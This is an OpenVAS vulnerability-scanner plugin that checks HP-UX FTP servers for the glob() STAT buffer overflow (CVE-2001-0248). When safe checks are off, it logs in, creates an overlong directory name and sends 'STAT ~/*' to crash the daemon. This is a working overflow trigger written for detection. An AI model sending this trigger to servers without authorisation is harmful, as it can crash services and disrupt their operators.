# OpenVAS Vulnerability Test
# $Id: hpftp_glob_stat.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: HP-UX ftpd glob() Expansion STAT Buffer Overflow
#
# Authors:
# Xue Yong Zhi <xueyong@udel.edu>
#
# Copyright:
# Copyright (C) 2003 Xue Yong Zhi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Buffer overflow in FTP server in HPUX 11 and previous
allows remote attackers to execute arbitrary commands
by creating a long pathname and calling the STAT
command, which uses glob to generate long strings.";

tag_solution = "upgrade your FTP server
Consider removing directories writable by 'anonymous'.";

# TODO: have not observered enough HP-UX FTP banners, safecheck
# is inaccurate and even wrong!
#
# TODO: do not check other FTPD 
#
# From COVERT-2001-02:
# "when an FTP daemon receives a request involving a
# file that has a tilde as its first character, it typically runs the
# entire filename string through globbing code in order to resolve the
# specified home directory into a full path.  This has the side effect
# of expanding other metacharacters in the pathname string, which can
# lead to very large input strings being passed into the main command
# processing routines. This can lead to exploitable buffer overflow
# conditions, depending upon how these routines manipulate their input."

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11372");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2552);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-2001-0248");
 name = "HP-UX ftpd glob() Expansion STAT Buffer Overflow";
 script_name(name);
 script_category(ACT_MIXED_ATTACK);
 script_tag(name:"qod_type", value:"remote_banner"); 
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2003 Xue Yong Zhi");
 script_dependencies("find_service.nasl", "ftp_writeable_directories.nasl");
 script_mandatory_keys("ftp/login", "ftp/writeable_dir");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);


# First, we need access
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");


# Then, we need a writeable directory
wri = get_kb_item("ftp/writeable_dir");


safe_checks = 0;
if(!login || !password || !wri || safe_checks())safe_checks = 1;


if(safe_checks)
{
 banner = get_ftp_banner(port: port);
 if(banner)
 {
  vuln = 0;

  #HP-UX 10.0, 10.10, 10.20, 10.30, 11.0(ICAT)
  #HP HP-UX 10.0.1, 10.10, 10.20, 11.0 and HP HP-UX (VVOS) 10.24, 11.0.4(bugtrap)
  #Actually Looking for 10.*, 11.0* here
  if(ereg(pattern:"FTP server.*[vV]ersion[^0-9]*(10\.[0-9]+|11\.0)",
  	  string:banner))vuln = 1;

  if(vuln)
  {
    report = "
Buffer overflow in FTP server in HPUX 11 and previous
allows remote attackers to execute arbitrary commands
by creating a long pathname and calling the STAT
command, which uses glob to generate long strings.

*** OpenVAS reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution: upgrade your FTP server and/or libc
Consider removing directories writable by 'anonymous'.";

  security_message(port:port, data:report);
  }
 }

 exit(0);
}


# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 if(login && wri)
 {
	if(ftp_log_in(socket:soc, user:login, pass:password))
	{
		# We are in

		c = string("CWD ", wri, "\r\n");
		send(socket:soc, data:c);
		b = ftp_recv_line(socket:soc);
		if(!ereg(pattern:"^250.*", string:b)) exit(0);
		mkd = string("MKD ", crap(505), "\r\n");	#505+4+2=511
		mkdshort = string("MKD ", crap(249), "\r\n");	#249+4+2=255
		stat = string("STAT ~/*\r\n");

		send(socket:soc, data:mkd);
		b = ftp_recv_line(socket:soc);
		if(!ereg(pattern:"^257 .*", string:b)) {
			#If the server refuse to creat a long dir for some 
			#reason, try a short one to see if it will die.
			send(socket:soc, data:mkdshort);
			b = ftp_recv_line(socket:soc);
			if(!ereg(pattern:"^257 .*", string:b)) exit(0);
		}

		#STAT use control channel
		send(socket:soc, data:stat);
		b = ftp_recv_line(socket:soc);

                send(socket:soc, data:'RMD ' + crap(505) + '\r\n');
                send(socket:soc, data:'RMD ' + crap(249) + '\r\n');

		if(!b){
			security_message(port);
			exit(0);
		} else {
			ftp_close(socket:soc);
		}

	}
 }
}
